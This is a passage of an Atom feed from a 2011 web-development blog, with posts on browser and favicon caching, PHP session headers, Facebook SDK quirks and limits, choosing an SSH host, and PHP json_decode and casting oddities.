&lt;h2&gt;Firefox 4.0&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Initial load&lt;/strong&gt; : No issue arising. It does fetch each resource once.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Link reload, navigational reload and soft reload&lt;/strong&gt; : Fetches everything from cache, nice.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hard reload&lt;/strong&gt; : Re-request jpg and swf files by adding a &lt;code&gt;Cache-Control: max-age=0&lt;/code&gt; request header. This feels like the expected behavior.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Take care of that favicon</title>
   <link href="http://blog.pixelastic.com/2011/06/01/care-favicon/"/>
   <updated>2011-06-01T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/06/01/care-favicon</id>
   <content type="html">&lt;p&gt;Even if you are not referencing it in your HTML markup, browsers will try to
get a file named &lt;code&gt;/favicon.ico&lt;/code&gt; on your server root. Let&amp;#39;s see some good
practice regarding this file.&lt;/p&gt;

&lt;h2&gt;Make it small&lt;/h2&gt;

&lt;p&gt;The smaller the file, the faster it will get downloaded. As it is a less than
important file, we don&amp;#39;t want to delay the loading of our page for such a tiny
graphic. The default file format for such a file is &lt;code&gt;image/x-icon&lt;/code&gt;, meaning
the .ico extension.&lt;/p&gt;

&lt;p&gt;I think it&amp;#39;s a Microsoft legacy format, but well understood by every browser.
Be careful when putting your favicon, don&amp;#39;t just find a cool &lt;code&gt;.ico&lt;/code&gt; file and
drop it here. Icon files are containers, they hold various image format
ranging from 16x16 to 512x512.&lt;/p&gt;

&lt;p&gt;You clearly don&amp;#39;t need the bigger one and the 16x16 will be highly enough. So,
be careful.&lt;/p&gt;

&lt;p&gt;The best way of creating the favicon I&amp;#39;ve found is to first create it as a
&lt;code&gt;.gif&lt;/code&gt;, then running ImageMagick upon it. On Linux, this means running&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;convert favicon.gif -resize 16x16! favicon.ico
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Make it cacheable&lt;/h2&gt;

&lt;p&gt;This file will be requested by the browser on every request, so you&amp;#39;d better
make it cacheable to limit the number of requests.&lt;/p&gt;

&lt;p&gt;Also, note that you can&amp;#39;t change the name of the file, &lt;code&gt;favicon.ico&lt;/code&gt; will
always be fetched.&lt;/p&gt;

&lt;p&gt;I choose to cache mine for a year, like any other static asset. I could have
gone for a month, to allow updating them more often but I&amp;#39;ve never ever
changed a favicon, so a year seems better.&lt;/p&gt;

&lt;h2&gt;A note on Safari Win&lt;/h2&gt;

&lt;p&gt;From the tests I&amp;#39;ve done, almost all browsers behave the same regarding
favicon fetching and caching : the fetch it last, and do not issue a Cache-
Control:max-age=0 on a refresh to force redownloading it.&lt;/p&gt;

&lt;p&gt;Except Safari Win. It fetch it along other downloads and re-dewnload it on a
page refresh.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>PHP sessions and the Pragma:no-cache header</title>
   <link href="http://blog.pixelastic.com/2011/05/30/php-sessions-pragma-cache-header/"/>
   <updated>2011-05-30T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/05/30/php-sessions-pragma-cache-header</id>
   <content type="html">&lt;p&gt;You may have seen the &lt;code&gt;Pragma:no-cache&lt;/code&gt; response header on various website (if
you&amp;#39;re that kind of guy actually reading HTTP response headers...).&lt;/p&gt;

&lt;p&gt;What you may not know is that this Header doesn&amp;#39;t actually exists. The Pragma
header &lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.32&quot;&gt;is supposed to
be&lt;/a&gt; *&lt;em&gt;Request
*&lt;/em&gt;header, not a *&lt;em&gt;Response *&lt;/em&gt;header.&lt;/p&gt;

&lt;p&gt;It is not only useless, it may also trigger strange caching bugs in IE6. I&amp;#39;m
sure you know what kind of IE6 quirks I&amp;#39;m talking about. The best is to remove
it, just to be sure.&lt;/p&gt;

&lt;p&gt;This is a common misconception (I myself didn&amp;#39;t know that before reading &lt;a href=&quot;http://www.mnot.net/cache_docs/&quot;&gt;this
excellent caching tutorial&lt;/a&gt;), and that header
is still returned in a lot of request.&lt;/p&gt;

&lt;p&gt;For example, if you set your &lt;code&gt;session.cache_limiter&lt;/code&gt; to &lt;code&gt;nocache&lt;/code&gt;in your
&lt;code&gt;php.ini&lt;/code&gt;, then PHP will send this header (as defined in the
&lt;a href=&quot;http://ca.php.net/manual/en/function.session-cache-%0Alimiter.php&quot;&gt;session&lt;em&gt;cache&lt;/em&gt;limiter&lt;/a&gt; doc. This is obviously wrong.&lt;/p&gt;

&lt;p&gt;It also adds a weird &lt;code&gt;Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt;/code&gt; header. I don&amp;#39;t
like it as it allow easy fingerprinting of the server-side technology used.&lt;/p&gt;

&lt;p&gt;I changed my &lt;code&gt;session.cache_delimiter&lt;/code&gt; value to &lt;code&gt;private_no_expire&lt;/code&gt; to return
better headers.&lt;/p&gt;

&lt;p&gt;First, it removed the useless &lt;code&gt;Pragma&lt;/code&gt;, but it also removes the &lt;code&gt;Expires
&lt;/code&gt;header (&lt;code&gt;Cache-Control&lt;/code&gt; is enough).&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Working on Wednesday #1</title>
   <link href="http://blog.pixelastic.com/2011/05/25/working-wednesday-1/"/>
   <updated>2011-05-25T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/05/25/working-wednesday-1</id>
   <content type="html">&lt;p&gt;Starting June 15th, I&amp;#39;ll stop working at my day job for one day a week.
Instead, I&amp;#39;ll use this time to work on personal projects.&lt;/p&gt;

&lt;p&gt;After more than 3 years of freelancing, I&amp;#39;ve been working full time for a very
nice young company (making a great social game) for the past 6 months. Today,
with the public release of the game, I find myself missing freelance.&lt;/p&gt;

&lt;p&gt;I liked being able to sleep when too tired, working late at night when really
productive, reading a log of blog posts on various subjects, learning new cool
stuff other did. I kinda miss that on my new job.&lt;/p&gt;

&lt;p&gt;Sure our project is damn cool and I really like working on it. I learn a lot,
in fields that I was interested in but never had the chance to explore (server
administration, CDN configuration, memcache, large number of users, etc).&lt;/p&gt;

&lt;p&gt;But on the other hand, I&amp;#39;m almost only doing server-side work. I relatively
interesting part of Javascript (nothing fancy) and a really small part of CSS.&lt;/p&gt;

&lt;p&gt;And I miss all that front-end part of the job. I also get kind of tired of
using cakePHP. I do like it a lot, but the more I write PHP and read posts
about Ruby, the more I want to switch.&lt;/p&gt;

&lt;h2&gt;Working 4 days a week&lt;/h2&gt;

&lt;p&gt;I finally made a deal with my boss, for not working on Wednesday. I want to
use that time to relax and learn all those things.&lt;/p&gt;

&lt;p&gt;The last time I was working full time for a company, I finally quit because I
thought I was waaaaaaay late behind all the current tech trends. It took me a
couple of month to learn the cool stuff I&amp;#39;m armed with today : jQuery and
cakePHP.&lt;/p&gt;

&lt;p&gt;This time, I want to re-learn a whole new world, a better one. Using all I
learnt those past years to make a fresh start.&lt;/p&gt;

&lt;h2&gt;What I want to learn&lt;/h2&gt;

&lt;p&gt;There&amp;#39;s a lot of things I would love to learn, unordered :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vim&lt;/code&gt; : I want to be able to write code on any machine, easily, and fast&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ruby&lt;/code&gt; / &lt;code&gt;rails&lt;/code&gt; : I want to learn Ruby to be able to fully understand Rails. I have a pretty strong knowledge of cakePHP so I guess Rails won&amp;#39;t be too hard for me.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git&lt;/code&gt; : I like Mercurial, but &lt;code&gt;git&lt;/code&gt; seems to be the de-facto VCS for all the social geeks and rails coder, so why not ?&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sass&lt;/code&gt; and &lt;code&gt;haml&lt;/code&gt; : Those seems awesome, and were part of the things that make me want to try ruby. Writing CSS and HTML in a non-painful way. I already want to write modules (or are they called gems?) to enhance them, adding webperf optimisations on the fly (creating sprites/dataURI, optimizing selectors, etc).&lt;/li&gt;
&lt;li&gt;CoffeeScript, Kafeeine or equivalent : Following the logic behind sass, I want to be able to write Javascript easily. I always encounter issues when my jQuery code became too big, everything gets tangled together. Backbone.js seems interesting too. I&amp;#39;ll have to test all those solution.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nodejs&lt;/code&gt; : Because it looks kinda fun. I haven&amp;#39;t really understand how it works yet, but it looks fun anyway :)&lt;/li&gt;
&lt;li&gt;TDD : This is not a technology, but a way of writing code that I want to learn. I tried it in cakePHP, but I spent so much time writing tests (and making them work), to finally change the implementation and broke the tests that I finally gave up. I still have to understand HOW to do it properly. I thought I read somewhere that this principle was directly intergrated into Ruby (or was it Rails ?) development.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To summarize, I want to learn the good tools that will let me focus on the
project(s) I want to make, not fighting to use tools to bend them to my needs.
Writing &amp;quot;uncompiled&amp;quot; css, html or Javascript and having some automation tool
to automatically transform it in the most usable version to use only.&lt;/p&gt;

&lt;p&gt;Also, I have already written a pretty decent cakePHP CMS, with a full featured
admin panel that I used when making website for clients. I wanted to put it
open source for all to enjoy but never really knew how to do it. I don&amp;#39;t yet
know if I want to create a whole new CMS in Rails, or if I&amp;#39;ll do custom dev
for each project, or use (and enhancing) existing CMS.&lt;/p&gt;

&lt;h2&gt;That&amp;#39;s all for now&lt;/h2&gt;

&lt;p&gt;I might have forgotten stuff (I&amp;#39;d want to try couchDB/mongoDB, getting better
at using Linux everyday), but here is a dump of all the things I want to
achieve in the next 6 month, one day per week. I&amp;#39;ll try to post a summary of
what I learned each Wednesday, hoping that it would help others (I know I&amp;#39;ll
surely enjoy looking back at it later).&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Missing bits of the official Facebook documentation</title>
   <link href="http://blog.pixelastic.com/2011/05/24/missing-bits-official-facebook-documentation/"/>
   <updated>2011-05-24T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/05/24/missing-bits-official-facebook-documentation</id>
   <content type="html">&lt;p&gt;As a complement to my post about FB.ui undocumented hard limit, here are some
other parts that should be in the documentation.&lt;/p&gt;

&lt;h2&gt;Custom html tag&lt;/h2&gt;

&lt;p&gt;You have to add &lt;code&gt;xmlns:fb=&amp;quot;http://www.facebook.com/2008/fbml&amp;quot;
xmlns:og=&amp;quot;http://opengraphprotocol.org/schema/&amp;quot;&lt;/code&gt; to your main &lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;
element.&lt;/p&gt;

&lt;p&gt;If you don&amp;#39;t, the &lt;code&gt;&amp;lt;fb:like&amp;gt;&lt;/code&gt; (and possibly other &lt;code&gt;&amp;lt;fb:*&amp;gt;&lt;/code&gt; elements) won&amp;#39;t
work in IE. I guess those unorthodox tags won&amp;#39;t be interpreted by IE until you
define the correct xmlns.&lt;/p&gt;

&lt;h2&gt;Adding a #fb-root&lt;/h2&gt;

&lt;p&gt;You also have to add a &lt;code&gt;&amp;lt;div id=&amp;quot;fb-root&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt; in your html code. I guess
the Javascript API use it for some stuff, but I don&amp;#39;t really know why.&lt;/p&gt;

&lt;p&gt;The Javascript SDK logs an error message asking for this missing element if
you don&amp;#39;t have it.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Whitelisting keys of an array</title>
   <link href="http://blog.pixelastic.com/2011/05/11/whitelisting-keys-array/"/>
   <updated>2011-05-11T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/05/11/whitelisting-keys-array</id>
   <content type="html">&lt;p&gt;I needed to validate an array create from POSTed data. I wanted to discard all
keys from this array that I didn&amp;#39;t want.&lt;/p&gt;

&lt;p&gt;Actually, I wanted to whitelist the array, and only keep keys that were on my
whitelist.&lt;/p&gt;

&lt;p&gt;Here is the litte snippet that does it :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  Keep only specified keys of the specified array. This is useful to whitelist an array of parameters.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  \paramÂ Â Â  $arrayÂ Â Â  Â Â Â  Original array&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  \paramÂ Â Â  $whitelistÂ Â Â  Â Â Â  Array of keys to keep.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;**/&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;function array_whitelist($array, $whitelist = array()) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  return array_intersect_key($array, array_flip($whitelist));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Hard limits using FB.ui to post Requests</title>
   <link href="http://blog.pixelastic.com/2011/05/10/hard-limits-fb-ui-post-requests/"/>
   <updated>2011-05-10T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/05/10/hard-limits-fb-ui-post-requests</id>
   <content type="html">&lt;p&gt;I hate Facebook documentation. All pages seems out of date, displaying wrong
function signature, obsolete parameters, documentation link pointing to 404
pages, etc, etc.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve lost some hours debugging those calls, finding whatever hard limit
Facebook forced on some of the arguments.&lt;/p&gt;

&lt;p&gt;Let us write a very basic example code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;FB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ui&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;method&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;apprequests&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;display&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;iframe&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;message&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Hey, this Request is awesome, just accept it, ok ?&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;title&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Awesome request incoming&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&amp;#39;filters&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Some friends&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;user_ids&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;97841578&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;548673131&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;[...]&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Some other friends&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;user_ids&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;97841578&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;56867134&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;[...]&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This should open a Request popup with the custom title and message, as well as
provide a list of friends that you can filter based on two criterias : &amp;quot;Some
friends&amp;quot; and &amp;quot;Some other friends&amp;quot;.&lt;/p&gt;

&lt;h2&gt;What will go wrong&lt;/h2&gt;

&lt;p&gt;First, you have to know that both the message and title have a character
limit. If you go over it, the popup will simply display something like &amp;quot;An
error occurred, blah blah blah&amp;quot;.&lt;/p&gt;

&lt;p&gt;After some fiddling, I discovered that the limit is 50 chars for the title and
255 for the message.&lt;/p&gt;

&lt;p&gt;&lt;del&gt;Also, there is no limit (as far as I know) to the limit of custom filters
you can set.&lt;/del&gt; See update below. But there is one to the max number of
users you can define in a filter. And that number is 1000.&lt;/p&gt;

&lt;p&gt;This means that if my &lt;code&gt;user_ids&lt;/code&gt; list for any of my custom filters contains
more than 1000 users, the popup will fail. However, you can have as many
filters with 999 users as you want.&lt;/p&gt;

&lt;p&gt;Took me a little while to find, and I thought that this could be shared.&lt;/p&gt;

&lt;h2&gt;Update&lt;/h2&gt;

&lt;p&gt;I found a new hard limit : You can&amp;#39;t set more than 5 filters at a time. If you
add one more, the Request popup will fail.&lt;/p&gt;

&lt;h2&gt;New Update&lt;/h2&gt;

&lt;p&gt;Also, if you define a callback, don&amp;#39;t forget to &lt;code&gt;return true&lt;/code&gt;. Otherwise
Webkit will refuse to close the FB popup and you&amp;#39;ll have to click twice for it
to really close itself.&lt;/p&gt;

&lt;h2&gt;Update (bis repetita)&lt;/h2&gt;

&lt;p&gt;This one was pretty hard to find but if your filter contains a facebook id of
someone that is not a friend of the currently loggued user, the filter will
display nothing.&lt;/p&gt;

&lt;p&gt;In our app, we have a filter of &amp;quot;Neighbors&amp;quot; (as most social games do). But one
of thoses neighbors removed the user from its friends, and we didn&amp;#39;t update
the neighbor list to reflect that, resulting in our &amp;quot;Neighbors&amp;quot; filter being
empty.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Finding the perfect SSH host</title>
   <link href="http://blog.pixelastic.com/2011/05/10/finding-perfect-ssh-host/"/>
   <updated>2011-05-10T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/05/10/finding-perfect-ssh-host</id>
   <content type="html">&lt;p&gt;I&amp;#39;m trying to find a company providing hosting capabilities. I have a strong
set of pre-requisites.&lt;/p&gt;

&lt;h2&gt;Connected through SSH&lt;/h2&gt;

&lt;p&gt;I want the server to be accessible through SSH. I don&amp;#39;t need http nor ftp
acces on it.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll host git, mercurial and subversion repositories on it, and will
push(/pull) from(/to) them using ssh.&lt;/p&gt;

&lt;p&gt;So, I will need those softs installed, or at least enough power to install
them (even locally).&lt;/p&gt;

&lt;h2&gt;Serving as an SSL tunnel&lt;/h2&gt;

&lt;p&gt;I also want to be able to create an SSH tunnel through this server. That way I
could be securely connected from any wifi connection using SSL.&lt;/p&gt;

&lt;p&gt;The server should have a pretty reasonable bandwidth. I&amp;#39;d also wish to avoid
having it hosted in France. Peering agreement between providers in France are
getting uglier and uglier.&lt;/p&gt;

&lt;h2&gt;Secondary accounts for holding websites&lt;/h2&gt;

&lt;p&gt;If the same company also provides more conventional hosting, that also could
be an important part of my choice.&lt;/p&gt;

&lt;p&gt;What I would like is something as flexible as allowing some websites to use
Apache, and others Lighttpd. Even being able to configure it per subdomain.&lt;/p&gt;

&lt;p&gt;Some sites would be running PHP, others Rails, even node.js. I want enough
freedom to configure it and the associated inner config (lighttpd.conf,
php.ini).&lt;/p&gt;

&lt;p&gt;I also want to be able to install secondary parts like mongoDB or memcache and
having a full access to their configuration.&lt;/p&gt;

&lt;h2&gt;Pricing&lt;/h2&gt;

&lt;p&gt;Of course, the cheaper the better, but I know that such an amount of freedom
and features comes with its own price.&lt;/p&gt;

&lt;p&gt;Now, let&amp;#39;s review some of the contestants I&amp;#39;ve picked&lt;/p&gt;

&lt;h2&gt;Alwaysdata&lt;/h2&gt;

&lt;p&gt;They were the first I &lt;a href=&quot;http://www.alwaysdata.com/&quot;&gt;checked&lt;/a&gt;. I heard quite a
good thing about their service and reliability. They really seem to know what
they&amp;#39;re doing.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve tried their free 10Mo plan and am quite satisfied with it. Mercurial,
git, subversion and quite a batch of others softs are already installed. They
also have a pretty 10Mo/s awesome bandwith.&lt;/p&gt;

&lt;p&gt;I haven&amp;#39;t tried their hosting plans, but they also seems nice. All default
(shared) hosting provides php, perl, ruby and python.&lt;/p&gt;

&lt;p&gt;Their custom (managed dedicated server) provides almost anything you could
want from lightty to memcache, but the price goes high with it to. 350â¬/month
that is way too much I can afford for what I have in mind.&lt;/p&gt;

&lt;p&gt;On the other hand, they not only provide hosting but the whole support package
along with hotline and custom installation.&lt;/p&gt;

&lt;h2&gt;Dreamhost&lt;/h2&gt;

&lt;p&gt;I&amp;#39;m fond of Dreamhost. I&amp;#39;ve used them for years. They do provide a very nice
shared hosting, with a lot of options to configure. They even allow cronjob
for their admin panel.&lt;/p&gt;

&lt;p&gt;And they are cheap, with a customer support very professional, I highly
recommend them for your simple hosting needs.&lt;/p&gt;

&lt;p&gt;I haven&amp;#39;t tested their dedicated server version, so can&amp;#39;t really talk about
it.&lt;/p&gt;

&lt;p&gt;However, the SSH capabilities of the shared hosting are quite small. They have
git, svn and mercurial installed, but the version are quite outdated. Even the
python version running mercurial was out of date.&lt;/p&gt;

&lt;p&gt;You can however download and install them yourself on your account (which I
did), but it is not as full featured as alwaysdata.&lt;/p&gt;

&lt;p&gt;Their bandwith is also capped to 1Mo/s.&lt;/p&gt;

&lt;h2&gt;OVH&lt;/h2&gt;

&lt;p&gt;Haven&amp;#39;t tested yet, but their &lt;a href=&quot;https://www.ovh.com/fr/vps/&quot;&gt;VPS offer&lt;/a&gt; seems
nice for as low as 60â¬/year.&lt;/p&gt;

&lt;p&gt;I have tried the shared hosting offer of OVH before and am mitigated. On one
hand I like some of their features like the automatic backup of your ftp
files, on the other hand their administration panel is a total mess and
accessing the server through SSH is not that simple.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve heard they have a 10Mo/s bandwith. I&amp;#39;ll try to get more information on
this.&lt;/p&gt;

&lt;h2&gt;Gandi&lt;/h2&gt;

&lt;p&gt;Gandi is an amazing registrar (both technically and ethically). I&amp;#39;ve never had
any issues with their service and can only praise their technical support.&lt;/p&gt;

&lt;p&gt;Some years ago, they started doing hosting too. I tested it back then and was
quite disapointed. This was horribly slow and crashed.&lt;/p&gt;

&lt;p&gt;I never tried it again since then. I think they improved their service, and I
just asked a test account. Their VPS offer is interesting, the server is
pretty decent from what I can read and the price is still in my range
(12â¬/month).&lt;/p&gt;

&lt;p&gt;&lt;em&gt;I&amp;#39;ll continue this review later, with more information. If you, reader, have
any suggestion on a good host filling my need, feel free to post it in the
comments, I&amp;#39;ll review it.&lt;/em&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Another PHP casting weirdness</title>
   <link href="http://blog.pixelastic.com/2011/05/06/php-casting-strangeness/"/>
   <updated>2011-05-06T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/05/06/php-casting-strangeness</id>
   <content type="html">&lt;p&gt;Second weird PHP behavior behavior of the day :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$foo = false;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;echo $foo[&amp;#39;bar&amp;#39;]; // Ouptuts nothing, but doesn&amp;#39;t throw an error either&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Strange. I try to read an undefined index (&lt;code&gt;false&lt;/code&gt;is not an array), but PHP
doesn&amp;#39;t complain. That&amp;#39;s weird.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$foo = true;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;echo $foo[&amp;#39;bar&amp;#39;]; // Throws an error&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This time, PHP tells me that the index is not defined and throws an error.
Wait, what ?&lt;/p&gt;

&lt;p&gt;Apparently, this is the intended behavior, but it does seem a bit strange...&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>json_decode casts strings to floats</title>
   <link href="http://blog.pixelastic.com/2011/05/06/json-decode-casts-strings-floats/"/>
   <updated>2011-05-06T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/05/06/json-decode-casts-strings-floats</id>
   <content type="html">&lt;p&gt;The PHP function &lt;a href=&quot;http://fr.php.net/manual/en/function.json-%0Adecode.php&quot;&gt;json_decode&lt;/a&gt; takes a JSON string as argument and return a decoded array/object
.&lt;/p&gt;

&lt;p&gt;However, when passing an argument that has nothing to do with a JSON string,
the function was supposed to return null. But, in practice, this didn&amp;#39;t go so
well.&lt;/p&gt;

&lt;h2&gt;Passing a string&lt;/h2&gt;

&lt;p&gt;Here&amp;#39;s an example :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$foo = &amp;#39;foo&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$bar = json_decode($foo);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;// $bar is nothing,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;echo (is_null($bar)) ? &amp;quot;This is null&amp;quot; : &amp;quot;This is not null&amp;quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Passing a float&lt;/h2&gt;

&lt;p&gt;Here, we try to decode a string. The function rejects it and returns null.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$foo = 0.4;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$bar = json_decode($foo);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;// $bar is a float&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;echo (is_float($bar)) ? &amp;quot;This is a float&amp;quot; : &amp;quot;This is not a float&amp;quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here, we pass a floating number. And the function returns... a floating
number. Wait, what ?&lt;/p&gt;

&lt;p&gt;This is weird, I expected it to return null, once again. But maybe it&amp;#39;s
correct and the JSON specs says so. I didn&amp;#39;t check, actually.&lt;/p&gt;

&lt;h2&gt;Passing a string thats looks like a float&lt;/h2&gt;

&lt;p&gt;But the next example is even better :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$foo = &amp;#39;0.4&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$bar = json_decode($foo);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;// $bar is also a float, even if $foo was a string&lt;/span&gt;
